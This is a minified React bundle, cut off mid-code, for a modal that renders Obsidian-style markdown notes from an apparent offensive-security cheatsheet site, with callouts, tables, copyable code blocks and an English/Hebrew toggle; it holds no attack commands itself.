import{r as n,j as e,aN as K,C as de,T as he,d as ce,aM as Se,X as Qe,as as Bt,ao as Dt,aZ as Wt,a_ as Xe,a0 as Ut,ar as Vt,a$ as Gt,e as He,a5 as et,aY as zt,b0 as qt,aB as Kt,b1 as Yt,E as Xt,ab as Jt,aw as Zt,b2 as Qt,a2 as $t,aT as _e,b3 as Re,I as je,R as Nt,Z as er,b4 as tr,s as Je,D as rr,l as sr,u as ar,o as nr,g as Pe,k as or,_ as ft,b5 as lr,av as ir,b6 as cr,a8 as dr,aD as pr,f as yt,W as mr,ap as ur,an as xr}from"./vendor-framework-CvQAcO8f.js";import{S as hr,p,i as fe,d as Ze,u as Be,a as wt,o as br}from"./index-B13aSfPa.js";import{p as gr,a as fr,r as vt,b as kt,C as St,c as yr,d as wr,s as vr,e as kr,f as Sr,h as Ae,i as Ne}from"./obsidianManualUtils-M-zA6VD6.js";import{m as re}from"./vendor-ui-CXxOSkDg.js";import"./vendor-utils-oQXWb4Lk.js";import"./tracks-data-BVlFPHXm.js";import"./methodology-data-CbduTmc6.js";import"./cpts-vault-data-CUuU5G9N.js";const $r=({note:a,globalVars:C,soundEnabled:B,onClose:g,onNavigateToNote:D,onDeleteNote:L,defaultLanguage:ne="en"})=>{const[U,u]=n.useState("reading"),[E,F]=n.useState(ne),[X,oe]=n.useState(null),[v,A]=n.useState({}),[R,Z]=n.useState({}),$=n.useMemo(()=>gr(a.rawMarkdown||""),[a.rawMarkdown]),pe=n.useMemo(()=>fr(a.id),[a.id]);n.useMemo(()=>!$.callouts||$.callouts.length===0?[]:$.callouts.filter(i=>{const c=/[\u0590-\u05FF]/.test(i.title+" "+i.content);return E==="he"?c:!c}),[$.callouts,E]);const M=n.useRef(null);n.useEffect(()=>{var i;(i=M.current)==null||i.focus()},[a.id]),n.useEffect(()=>{const i=c=>{c.key==="Escape"&&(c.preventDefault(),c.stopPropagation(),g())};return window.addEventListener("keydown",i,!0),()=>window.removeEventListener("keydown",i,!0)},[g]);const Y=(i,c)=>{navigator.clipboard.writeText(i),oe(c),B&&p("copy"),setTimeout(()=>oe(null),2e3)},y=()=>{if(!a.commands||a.commands.length===0)return;const i=a.commands.map(c=>fe(c,C)).join(`

`);Y(i,"all-cmds-"+a.id)},me=()=>{a.rawMarkdown&&Y(a.rawMarkdown,"raw-md-"+a.id)},W=(i,c=!1)=>{A(d=>{const x=d[i]!==void 0?d[i]:!c;return{...d,[i]:!x}})},le=(i,c)=>{if(!i)return[];const d=/(==[^=\n]+==|\*\*[^*\n]+\*\*|\*[^*\n]+\*|`[^`\n]+`|~~[^~\n]+~~)/g,x=[];let k=0,j;for(;(j=d.exec(i))!==null;){j.index>k&&x.push(i.substring(k,j.index));const r=j[1],o=`${c}-${j.index}`;r.startsWith("==")&&r.endsWith("==")&&r.length>4?x.push(e.jsx("mark",{className:"bg-amber-200/90 dark:bg-amber-400/25 text-amber-950 dark:text-amber-200 px-1 py-0.5 rounded font-medium",children:r.slice(2,-2)},o)):r.startsWith("**")&&r.endsWith("**")&&r.length>4?x.push(e.jsx("strong",{className:"font-bold text-slate-900 dark:text-white",children:r.slice(2,-2)},o)):r.startsWith("*")&&r.endsWith("*")&&r.length>2?x.push(e.jsx("em",{className:"italic",children:r.slice(1,-1)},o)):r.startsWith("`")&&r.endsWith("`")&&r.length>2?x.push(e.jsx("code",{className:"px-1.5 py-0.5 rounded font-mono text-[11px] bg-purple-100/70 dark:bg-black/60 border border-purple-200 dark:border-purple-900/40 text-purple-950 dark:text-cyan-300",children:r.slice(1,-1)},o)):r.startsWith("~~")&&r.endsWith("~~")&&r.length>4?x.push(e.jsx("span",{className:"line-through text-slate-400 dark:text-gray-500",children:r.slice(2,-2)},o)):x.push(r),k=j.index+r.length}return k<i.length&&x.push(i.substring(k)),x},N=i=>{var j;if(!i)return null;const c=[],d=/\[\[([^\]|#]+)(?:#[^\]|]+)?(?:\|([^\]]+))?\]\]/g;let x=0,k;for(;(k=d.exec(i))!==null;){if(k.index>x){const H=i.substring(x,k.index);c.push(...le(H,`pre-${k.index}`))}const r=k[1].trim(),o=((j=k[2])==null?void 0:j.trim())||r,S=vt(r);if(S.exists&&S.targetNoteId){const H=S.targetNoteId;c.push(e.jsxs("button",{type:"button",onClick:T=>{T.stopPropagation(),B&&p("click"),D(H)},className:"inline-flex items-center gap-1 px-1.5 py-0.5 mx-0.5 rounded text-[11px] font-mono font-bold bg-purple-100 dark:bg-purple-950/60 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:bg-purple-200 dark:hover:bg-purple-900/80 hover:text-purple-950 dark:hover:text-white hover:border-purple-400 hover:shadow-sm transition-all cursor-pointer",title:"Jump to note: "+r,children:[e.jsx(Xe,{className:"w-2.5 h-2.5 text-purple-600 dark:text-purple-400"}),e.jsxs("span",{children:["[[",o,"]]"]})]},"wl-"+k.index))}else c.push(e.jsxs("span",{className:"inline-flex items-center gap-0.5 px-1 py-0.2 mx-0.5 rounded text-[10px] font-mono text-slate-500 dark:text-cyber-muted bg-slate-100 dark:bg-white/5 border border-slate-200 dark:border-white/10",title:"Vault reference (not indexed): "+r,children:["[[",o,"]]"]},"wl-unres-"+k.index));x=k.index+k[0].length}if(x<i.length){const r=i.substring(x);c.push(...le(r,`post-${x}`))}return c},ie=(i,c)=>{const d=!!i.isFoldedByDefault,x=v[c]!==void 0?v[c]:!d,k={abstract:{border:"border-purple-300 dark:border-purple-500/50",bg:"bg-purple-50 dark:bg-purple-950/20",headerBg:"bg-purple-100 dark:bg-purple-950/40",text:"text-purple-900 dark:text-purple-300",icon:e.jsx($t,{className:"w-4 h-4 text-purple-600 dark:text-purple-400"})},tip:{border:"border-emerald-300 dark:border-emerald-500/50",bg:"bg-emerald-50 dark:bg-emerald-950/20",headerBg:"bg-emerald-100 dark:bg-emerald-950/40",text:"text-emerald-900 dark:text-emerald-300",icon:e.jsx(Qt,{className:"w-4 h-4 text-emerald-600 dark:text-emerald-400"})},warning:{border:"border-amber-300 dark:border-amber-500/50",bg:"bg-amber-50 dark:bg-amber-950/20",headerBg:"bg-amber-100 dark:bg-amber-950/40",text:"text-amber-900 dark:text-amber-300",icon:e.jsx(Zt,{className:"w-4 h-4 text-amber-600 dark:text-amber-400"})},danger:{border:"border-rose-300 dark:border-rose-500/50",bg:"bg-rose-50 dark:bg-rose-950/20",headerBg:"bg-rose-100 dark:bg-rose-950/40",text:"text-rose-900 dark:text-rose-300",icon:e.jsx(Jt,{className:"w-4 h-4 text-rose-600 dark:text-rose-400"})},example:{border:"border-blue-300 dark:border-blue-500/50",bg:"bg-blue-50 dark:bg-blue-950/20",headerBg:"bg-blue-100 dark:bg-blue-950/40",text:"text-blue-900 dark:text-blue-300",icon:e.jsx(he,{className:"w-4 h-4 text-blue-600 dark:text-blue-400"})},important:{border:"border-fuchsia-300 dark:border-fuchsia-500/50",bg:"bg-fuchsia-50 dark:bg-fuchsia-950/20",headerBg:"bg-fuchsia-100 dark:bg-fuchsia-950/40",text:"text-fuchsia-900 dark:text-fuchsia-300",icon:e.jsx(Xt,{className:"w-4 h-4 text-fuchsia-600 dark:text-fuchsia-400"})},cite:{border:"border-slate-300 dark:border-slate-500/50",bg:"bg-slate-100 dark:bg-slate-900/30",headerBg:"bg-slate-200 dark:bg-slate-900/50",text:"text-slate-800 dark:text-slate-300",icon:e.jsx(Yt,{className:"w-4 h-4 text-slate-600 dark:text-slate-400"})},success:{border:"border-green-300 dark:border-green-500/50",bg:"bg-green-50 dark:bg-green-950/20",headerBg:"bg-green-100 dark:bg-green-950/40",text:"text-green-900 dark:text-green-300",icon:e.jsx(Kt,{className:"w-4 h-4 text-green-600 dark:text-green-400"})},info:{border:"border-cyan-300 dark:border-cyan-500/50",bg:"bg-cyan-50 dark:bg-cyan-950/20",headerBg:"bg-cyan-100 dark:bg-cyan-950/40",text:"text-cyan-900 dark:text-cyan-300",icon:e.jsx(qt,{className:"w-4 h-4 text-cyan-600 dark:text-cyan-400"})},question:{border:"border-violet-300 dark:border-violet-500/50",bg:"bg-violet-50 dark:bg-violet-950/20",headerBg:"bg-violet-100 dark:bg-violet-950/40",text:"text-violet-900 dark:text-violet-300",icon:e.jsx(zt,{className:"w-4 h-4 text-violet-600 dark:text-violet-400"})},note:{border:"border-purple-300 dark:border-purple-500/40",bg:"bg-purple-50 dark:bg-purple-950/20",headerBg:"bg-purple-100 dark:bg-purple-950/40",text:"text-purple-900 dark:text-purple-300",icon:e.jsx(K,{className:"w-4 h-4 text-purple-600 dark:text-purple-400"})}},j=k[i.type]||k.note,r=/[\u0590-\u05FF]/.test(i.title)||/[\u0590-\u05FF]/.test(i.content);return e.jsxs("div",{className:"rounded-lg border "+j.border+" "+j.bg+" overflow-hidden shadow-sm my-3",dir:r?"rtl":"ltr",children:[e.jsxs("button",{type:"button",onClick:()=>W(c,d),className:"w-full p-2.5 px-3 flex items-center justify-between gap-2 text-xs font-bold "+j.headerBg+" "+j.text+" hover:brightness-110 transition-all cursor-pointer",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[j.icon,e.jsx("span",{children:i.title})]}),i.isFoldable&&e.jsx("span",{className:"text-cyber-muted text-[10px] font-mono flex items-center gap-1",children:x?e.jsx(He,{className:"w-3.5 h-3.5"}):e.jsx(et,{className:"w-3.5 h-3.5"})})]}),x&&e.jsx("div",{className:"p-3 text-xs leading-relaxed text-slate-800 dark:text-gray-200 "+(r?"text-right":"text-left")+" whitespace-pre-wrap font-sans",children:N(i.content)})]},"callout-"+c)},w=(i,c=!1)=>{if(!i)return null;const d=i.split(`
`),x=[];let k=!1,j="",r=[],o=!1,S=[];const H=h=>{const f=r.join(`
`),se=fe(f,C),b="code-block-"+h,m=X===b;x.push(e.jsxs("div",{className:"relative my-3 rounded-lg border border-purple-900/40 bg-slate-950 overflow-hidden shadow-md group",children:[e.jsxs("div",{className:"flex items-center justify-between px-3 py-1.5 bg-slate-900/90 border-b border-purple-900/40 text-[10px] font-mono text-purple-300",children:[e.jsxs("span",{className:"flex items-center gap-1.5 uppercase font-bold text-cyan-400",children:[e.jsx(Gt,{className:"w-3 h-3"}),j||"COMMAND / SCRIPT"]}),e.jsxs("button",{type:"button",onClick:()=>Y(se,b),className:"flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold transition-all cursor-pointer "+(m?"bg-emerald-500/20 text-emerald-400 border border-emerald-500/50":"bg-slate-800 border border-slate-700 text-slate-300 hover:text-white hover:border-purple-400"),children:[m?e.jsx(de,{className:"w-2.5 h-2.5 text-emerald-400"}):e.jsx(ce,{className:"w-2.5 h-2.5"}),e.jsx("span",{children:m?"Copied":"Copy"})]})]}),e.jsx("pre",{className:"p-3 text-xs font-mono text-cyan-300 overflow-x-auto whitespace-pre-wrap select-all selection:bg-purple-600 selection:text-white",dir:"ltr",children:se})]},"code-"+h)),r=[],k=!1},T=h=>{if(S.length<2){S=[],o=!1;return}const f=S[0],se=S.slice(2),b=Q=>Q.split("|").slice(1,-1).map(I=>I.trim()),m=b(f),G=se.map(b);x.push(e.jsx("div",{className:"my-3 overflow-x-auto rounded-lg border border-cyber-border bg-cyber-card/60",children:e.jsxs("table",{className:"w-full text-xs text-left",children:[e.jsx("thead",{className:"bg-purple-100 dark:bg-purple-950/40 border-b border-purple-200 dark:border-purple-900/40 text-[11px] font-mono text-purple-900 dark:text-purple-300 uppercase",children:e.jsx("tr",{children:m.map((Q,I)=>e.jsx("th",{className:"py-2 px-3 font-bold",children:N(Q)},I))})}),e.jsx("tbody",{className:"divide-y divide-purple-900/20 font-sans",children:G.map((Q,I)=>e.jsx("tr",{className:I%2===0?"bg-cyber-card/40":"bg-cyber-bg/30",children:Q.map((ee,z)=>e.jsx("td",{className:"py-2 px-3 text-slate-800 dark:text-gray-200",children:ee.startsWith("`")&&ee.endsWith("`")?e.jsx("code",{className:"text-cyber-cyan font-mono bg-cyber-code px-1.5 py-0.5 rounded border border-cyber-border text-[11px]",children:ee.slice(1,-1)}):N(ee)},z))},I))})]})},"table-"+h)),S=[],o=!1};for(let h=0;h<d.length;h++){const f=d[h];if(f.startsWith("```")){k?H(h):(o&&T(h),k=!0,j=f.replace("```","").trim());continue}if(k){r.push(f);continue}if(f.trim().startsWith("|")&&f.trim().endsWith("|")){o=!0,S.push(f);continue}else o&&T(h);const se=f.match(/^-\s*\[([ xX])\]\s*(.+)$/);if(se){const b=R[h]!==void 0?R[h]:se[1].toLowerCase()==="x",m=se[2],G=/[\u0590-\u05FF]/.test(m);x.push(e.jsxs("div",{className:"flex items-start gap-2.5 my-1.5 text-xs text-slate-800 dark:text-gray-200 font-sans cursor-pointer group",dir:G?"rtl":"ltr",onClick:()=>Z(Q=>({...Q,[h]:!b})),children:[e.jsx("div",{className:"w-4 h-4 rounded border flex items-center justify-center mt-0.5 flex-shrink-0 transition-colors "+(b?"bg-purple-600 border-purple-500 text-white":"border-cyber-border bg-cyber-bg group-hover:border-purple-400"),children:b&&e.jsx(de,{className:"w-3 h-3 stroke-[3]"})}),e.jsx("span",{className:b?"line-through text-cyber-muted":"",children:N(m)})]},"chk-"+h));continue}if(f.startsWith("# ")){const b=f.replace("# ","").trim(),m=/[\u0590-\u05FF]/.test(b),G="section-"+(b.toLowerCase().replace(/[^a-z0-9\u0590-\u05FF]+/g,"-").replace(/^-+|-+$/g,"")||h);x.push(e.jsx("h1",{id:G,dir:m?"rtl":"ltr",className:"text-lg font-bold text-slate-900 dark:text-white mt-4 mb-2 pb-1 border-b border-purple-200 dark:border-purple-900/40 scroll-mt-4",children:N(b)},"h1-"+h));continue}if(f.startsWith("## ")){const b=f.replace("## ","").trim(),m=/[\u0590-\u05FF]/.test(b),G="section-"+(b.toLowerCase().replace(/[^a-z0-9\u0590-\u05FF]+/g,"-").replace(/^-+|-+$/g,"")||h);x.push(e.jsxs("h2",{id:G,dir:m?"rtl":"ltr",className:"text-sm font-bold text-purple-900 dark:text-purple-300 mt-4 mb-1.5 flex items-center gap-1.5 scroll-mt-4",children:[e.jsx("span",{className:"text-purple-500 dark:text-purple-400",children:"§"}),e.jsx("span",{children:N(b)})]},"h2-"+h));continue}if(f.startsWith("### ")){const b=f.replace("### ","").trim(),m=/[\u0590-\u05FF]/.test(b),G="section-"+(b.toLowerCase().replace(/[^a-z0-9\u0590-\u05FF]+/g,"-").replace(/^-+|-+$/g,"")||h);x.push(e.jsx("h3",{id:G,dir:m?"rtl":"ltr",className:"text-xs font-bold text-cyan-700 dark:text-cyber-cyan mt-3 mb-1 scroll-mt-4",children:N(b)},"h3-"+h));continue}if(f.startsWith("> [!")){const b=f.match(/^>\s*\[!([a-zA-Z_-]+)\]([+-])?\s*(.*)$/);if(b){const m=b[1].toLowerCase(),G=b[2],Q=b[3].trim();let I="note";m==="abstract"||m==="summary"||m==="tldr"?I="abstract":m==="tip"||m==="hint"?I="tip":m==="warning"||m==="caution"||m==="attention"?I="warning":m==="danger"||m==="bug"||m==="failure"||m==="error"?I="danger":m==="example"||m==="meta"?I="example":m==="important"?I="important":m==="cite"||m==="quote"?I="cite":m==="success"||m==="check"||m==="done"?I="success":m==="info"?I="info":(m==="question"||m==="help"||m==="faq")&&(I="question");const ee=[];let z=h+1;for(;z<d.length&&(d[z].startsWith(">")||d[z].trim()==="")&&!d[z].startsWith("> [!");){if(d[z].trim()==="")if(z+1<d.length&&d[z+1].startsWith(">")){ee.push(""),z++;continue}else break;ee.push(d[z].replace(/^>\s?/,"")),z++}h=z-1;const Oe={type:I,title:Q||I.toUpperCase(),content:ee.join(`
`).trim(),isFoldable:G==="+"||G==="-",isFoldedByDefault:G==="-"};x.push(ie(Oe,h));continue}}if(f.startsWith(">")){const b=[f.replace(/^>\s?/,"")];let m=h+1;for(;m<d.length&&d[m].startsWith(">")&&!d[m].startsWith("> [!");)b.push(d[m].replace(/^>\s?/,"")),m++;h=m-1;const G=b.join(`
`),Q=/[\u0590-\u05FF]/.test(G);x.push(e.jsx("blockquote",{dir:Q?"rtl":"ltr",className:"my-3 pl-3.5 pr-2 py-2 border-l-3 border-purple-500 bg-purple-50/70 dark:bg-purple-950/20 rounded-r-lg text-xs text-slate-800 dark:text-gray-200 italic font-sans shadow-xs",children:N(G)},"bq-"+h));continue}if(f.trim()==="---"||f.trim()==="***"){x.push(e.jsx("hr",{className:"my-4 border-purple-900/30"},"hr-"+h));continue}if(f.trim().startsWith("- ")||f.trim().startsWith("* ")){const b=f.trim().slice(2),m=/[\u0590-\u05FF]/.test(b);x.push(e.jsxs("div",{dir:m?"rtl":"ltr",className:"flex items-start gap-2 my-1 text-xs text-slate-700 dark:text-gray-300 font-sans",children:[e.jsx("span",{className:"text-purple-400 mt-1",children:"•"}),e.jsx("div",{className:"flex-1",children:N(b)})]},"b-"+h));continue}if(f.trim()){const b=/[\u0590-\u05FF]/.test(f);x.push(e.jsx("p",{dir:b?"rtl":"ltr",className:"my-1.5 text-xs text-slate-700 dark:text-gray-300 leading-relaxed font-sans "+(b?"text-right":"text-left"),children:N(f)},"p-"+h))}}return k&&H(d.length),o&&T(d.length),x},V=e.jsx("div",{ref:M,tabIndex:-1,onClick:g,className:"fixed inset-0 z-[9999] flex items-center justify-center p-2 sm:p-4 md:p-6 bg-black/85 backdrop-blur-md animate-fadeIn outline-none",children:e.jsxs("div",{role:"dialog","aria-modal":"true","aria-label":`Field manual note: ${a.titleEn||a.title}`,onClick:i=>i.stopPropagation(),className:"relative w-full max-w-6xl max-h-[92vh] flex flex-col rounded-2xl border border-purple-500/40 bg-cyber-card shadow-2xl shadow-purple-950/50 overflow-hidden",children:[e.jsxs("div",{className:"flex items-center justify-between px-4 py-3 bg-cyber-bg/90 border-b border-purple-900/40",children:[e.jsxs("div",{className:"flex items-center gap-2 text-xs font-mono truncate max-w-xl",children:[e.jsxs("div",{className:"flex items-center gap-1.5 px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-950/60 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 font-bold",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"OFFENSIVE FIELD MANUAL"})]}),e.jsx("span",{className:"text-cyber-muted",children:"/"}),e.jsx("span",{className:"text-cyber-muted truncate",children:a.category}),a.subCategory&&e.jsxs(e.Fragment,{children:[e.jsx("span",{className:"text-cyber-muted",children:"/"}),e.jsx("span",{className:"text-purple-300 truncate",children:a.subCategory})]}),e.jsx("span",{className:"text-cyber-muted",children:"/"}),e.jsx("span",{className:"text-slate-900 dark:text-white font-bold truncate",children:a.titleEn||a.title})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs("div",{className:"hidden sm:flex items-center p-0.5 rounded-lg bg-slate-100 dark:bg-black/50 border border-slate-300 dark:border-purple-900/40 text-[11px] font-mono",children:[e.jsx("button",{type:"button",onClick:()=>u("reading"),className:"px-2.5 py-1 rounded transition-colors cursor-pointer "+(U==="reading"?"bg-purple-600 text-white font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"),title:"Obsidian rich formatted reading mode",children:"Reading"}),e.jsx("button",{type:"button",onClick:()=>u("raw"),className:"px-2.5 py-1 rounded transition-colors cursor-pointer "+(U==="raw"?"bg-purple-600 text-white font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"),title:"View raw Obsidian markdown",children:"Raw MD"})]}),e.jsxs("div",{className:"flex items-center p-0.5 rounded-lg bg-slate-100 dark:bg-black/50 border border-slate-300 dark:border-purple-900/40 text-[11px] font-mono",children:[e.jsx("button",{type:"button","data-testid":"modal-lang-en",onClick:()=>F("en"),className:"px-2.5 py-1 rounded transition-colors cursor-pointer "+(E==="en"?"bg-purple-600 text-white font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"),title:"English technical playbook only",children:"🇬🇧 EN"}),e.jsx("button",{type:"button","data-testid":"modal-lang-he",onClick:()=>F("he"),className:"px-2.5 py-1 rounded transition-colors cursor-pointer "+(E==="he"?"bg-purple-600 text-white font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"),title:"רשימות אישיות בעברית בלבד",children:"🇮🇱 עב"})]}),a.commands&&a.commands.length>0&&e.jsx("button",{type:"button",onClick:y,className:"hidden md:flex items-center gap-1 px-2.5 py-1 rounded bg-purple-100 dark:bg-purple-950/60 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:bg-purple-200 dark:hover:bg-purple-900/80 text-xs font-semibold transition-all cursor-pointer",title:"Copy all commands in note",children:X==="all-cmds-"+a.id?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(he,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Cmds (",a.commands.length,")"]})]})}),e.jsx(hr,{path:`/cheatsheets?note=${a.id}`,title:a.titleEn||a.title,label:"Share",className:"px-2.5 py-1"}),e.jsx("button",{type:"button",onClick:me,className:"flex items-center gap-1 px-2.5 py-1 rounded bg-black/60 border border-cyber-border text-cyber-muted hover:text-white hover:border-purple-400 text-xs font-semibold transition-all cursor-pointer",title:"Copy raw markdown to paste into your Obsidian vault",children:X==="raw-md-"+a.id?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{children:"MD Copied"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Copy MD"})]})}),L&&e.jsxs("button",{type:"button",onClick:()=>{const i=a.titleEn||a.title;window.confirm(`Delete field note "${i}" from your vault?`)&&(L(a.id,i),g())},className:"flex items-center gap-1 px-2.5 py-1 rounded bg-rose-100 dark:bg-rose-950/40 hover:bg-rose-200 dark:hover:bg-rose-900/60 border border-rose-300 dark:border-rose-800/60 hover:border-rose-500 text-rose-800 dark:text-rose-300 hover:text-rose-950 dark:hover:text-white text-xs font-semibold transition-all cursor-pointer shadow-sm",title:"Delete this field note",children:[e.jsx(Se,{className:"w-3.5 h-3.5 text-rose-500 dark:text-rose-400"}),e.jsx("span",{className:"hidden sm:inline",children:"Delete"})]}),e.jsx("button",{type:"button",onClick:g,className:"p-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-rose-500/50 hover:bg-rose-950/30 transition-all cursor-pointer",title:"Close note (Esc)",children:e.jsx(Qe,{className:"w-4 h-4"})})]})]}),e.jsxs("div",{className:"flex-1 overflow-y-auto p-4 sm:p-6 space-y-6",children:[e.jsxs("div",{className:"p-4 sm:p-5 rounded-xl border border-purple-200 dark:border-purple-900/40 bg-purple-50/50 dark:bg-black/40 space-y-3 shadow-inner",children:[e.jsxs("div",{className:"flex flex-col md:flex-row md:items-center justify-between gap-3",children:[e.jsx("div",{className:"space-y-1",children:e.jsxs("h1",{className:`text-xl sm:text-2xl font-black text-slate-900 dark:text-white tracking-tight flex items-center gap-2 ${E==="he"?"font-sans text-right":"font-mono text-left"}`,dir:E==="he"?"rtl":"ltr",children:[e.jsx("span",{className:"text-purple-400 flex-shrink-0",children:"🛡️"}),e.jsx("span",{children:E==="he"?a.titleHe||a.title:a.titleEn||a.title})]})}),e.jsxs("div",{className:"flex items-center gap-1.5 flex-wrap",children:[a.stage&&e.jsxs("span",{className:"px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-blue-100 dark:bg-blue-500/15 text-blue-800 dark:text-blue-300 border border-blue-300 dark:border-blue-500/30",children:["Stage: ",a.stage]}),e.jsx("span",{className:"px-2 py-0.5 rounded text-[10px] font-mono bg-purple-100 dark:bg-purple-500/15 text-purple-800 dark:text-purple-300 border border-purple-300 dark:border-purple-500/30",children:a.difficulty||"Core"}),e.jsx("span",{className:"px-2 py-0.5 rounded text-[10px] font-mono bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-slate-700 dark:text-cyber-muted",children:a.noteType||"Master Note"}),a.dateModified&&e.jsxs("span",{className:"px-2 py-0.5 rounded text-[10px] font-mono text-cyber-muted bg-black/40 border border-white/5 flex items-center gap-1",children:[e.jsx(Bt,{className:"w-2.5 h-2.5"}),a.dateModified]})]})]}),e.jsxs("div",{className:"flex items-center justify-between gap-2 pt-2 border-t border-purple-900/20 flex-wrap",children:[e.jsx("div",{className:"flex items-center gap-1 flex-wrap",children:a.tags&&a.tags.map(i=>e.jsxs("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-950/40 border border-purple-300 dark:border-purple-800/40 text-purple-900 dark:text-purple-300 font-mono",children:["#",i]},i))}),a.tools&&a.tools.length>0&&e.jsxs("div",{className:"flex items-center gap-1.5 flex-wrap",children:[e.jsx("span",{className:"text-[10px] font-mono text-cyber-muted",children:"Tools:"}),a.tools.map(i=>e.jsx("span",{className:"text-[10px] px-2 py-0.5 rounded bg-emerald-100 dark:bg-emerald-500/15 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-500/30 font-mono font-bold",children:i},i))]})]})]}),U==="raw"&&e.jsxs("div",{className:"rounded-xl border border-purple-900/40 bg-cyber-code overflow-hidden shadow-md",children:[e.jsxs("div",{className:"flex items-center justify-between px-4 py-2 bg-black/60 border-b border-purple-900/40 text-xs font-mono text-purple-300",children:[e.jsxs("span",{className:"flex items-center gap-2",children:[e.jsx(Dt,{className:"w-3.5 h-3.5 text-cyber-cyan"}),e.jsxs("span",{children:["RAW OBSIDIAN MARKDOWN (",(a.rawMarkdown||"").length," chars)"]})]}),e.jsxs("button",{type:"button",onClick:me,className:"flex items-center gap-1 px-2.5 py-1 rounded bg-purple-600 text-white font-bold text-xs hover:bg-purple-500 transition-colors cursor-pointer",children:[e.jsx(ce,{className:"w-3 h-3"}),e.jsx("span",{children:"Copy Markdown"})]})]}),e.jsx("pre",{className:"p-4 text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre-wrap select-all selection:bg-purple-600 selection:text-white",children:a.rawMarkdown})]}),U==="reading"&&e.jsxs("div",{className:"space-y-6",children:[$.tableOfContents&&$.tableOfContents.length>1&&e.jsxs("div",{className:"flex items-center gap-1.5 p-2 px-3 rounded-xl bg-purple-50/80 dark:bg-black/30 border border-purple-200 dark:border-purple-900/30 overflow-x-auto scrollbar-thin text-xs shadow-xs",children:[e.jsxs("div",{className:"flex items-center gap-1 text-[11px] font-mono text-purple-900 dark:text-purple-300 font-bold pr-1 border-r border-purple-200 dark:border-purple-800/40 flex-shrink-0",children:[e.jsx(Wt,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400"}),e.jsx("span",{children:"OUTLINE:"})]}),$.tableOfContents.map((i,c)=>e.jsxs("button",{type:"button",onClick:()=>{const d=document.getElementById("section-"+i.id);d&&(d.scrollIntoView({behavior:"smooth",block:"start"}),B&&p("click"))},className:"px-2 py-0.5 rounded text-[10.5px] font-medium bg-white dark:bg-purple-950/40 border border-purple-200 dark:border-purple-800/40 text-purple-900 dark:text-purple-200 hover:bg-purple-600 hover:text-white dark:hover:bg-purple-600 transition-all cursor-pointer flex-shrink-0",title:`Jump to section: ${i.text}`,children:[i.level>1?"↳ ":"",i.text]},c))]}),E==="he"?e.jsxs("div",{className:"p-4 sm:p-5 rounded-xl border border-purple-500/40 bg-purple-950/20 space-y-3",dir:"rtl",children:[e.jsxs("div",{className:"flex items-center justify-between pb-2 border-b border-purple-900/40",dir:"ltr",children:[e.jsx("span",{className:"text-[10px] font-mono text-purple-400",children:"DANIEL DAYAN PERSONAL FIELD CARD"}),e.jsx("h3",{className:"text-xs font-bold text-purple-300 font-sans",children:"כרטיס עבודה עברי מקיף — שלב אחר שלב"})]}),e.jsx("div",{className:"text-gray-200 text-xs leading-relaxed font-sans",children:$.hebrewSection?w($.hebrewSection,!0):e.jsxs("div",{className:"space-y-4 text-right",children:[e.jsx("p",{className:"text-purple-200 font-medium text-sm leading-relaxed",children:a.heSummary||a.summary}),a.commands&&a.commands.length>0&&e.jsxs("div",{className:"pt-2",children:[e.jsx("span",{className:"text-[10px] font-mono text-purple-400",children:"פקודות תקיפה מבצעיות:"}),e.jsx("div",{className:"space-y-2 mt-2",dir:"ltr",children:a.commands.map((i,c)=>e.jsx("div",{className:"p-2.5 rounded-lg bg-black/60 border border-purple-900/50 font-mono text-xs text-cyber-cyan select-all",children:fe(i,C)},c))})]})]})})]}):e.jsxs("div",{className:"p-4 sm:p-5 rounded-xl border border-cyber-border bg-cyber-bg/40 space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between pb-2 border-b border-purple-900/30",children:[e.jsxs("h3",{className:"text-xs font-bold text-cyber-cyan font-mono flex items-center gap-2",children:[e.jsx(he,{className:"w-4 h-4 text-purple-400"}),e.jsx("span",{children:"OFFENSIVE EXECUTION & TACTICAL PLAYBOOK"})]}),e.jsx("span",{className:"text-[10px] font-mono text-cyber-muted",children:"Battle-Tested Commands"})]}),e.jsx("div",{className:"text-gray-300 text-xs leading-relaxed",children:w($.englishSection,!1)})]})]}),e.jsxs("div",{className:"p-4 rounded-xl border border-purple-900/40 bg-black/40 space-y-3",children:[e.jsxs("div",{className:"flex items-center justify-between pb-2 border-b border-purple-900/30",children:[e.jsxs("h4",{className:"text-xs font-bold text-purple-300 font-mono flex items-center gap-2",children:[e.jsx(Xe,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"OBSIDIAN GRAPH CONNECTIONS & BACKLINKS"})]}),e.jsxs("span",{className:"text-[10px] font-mono 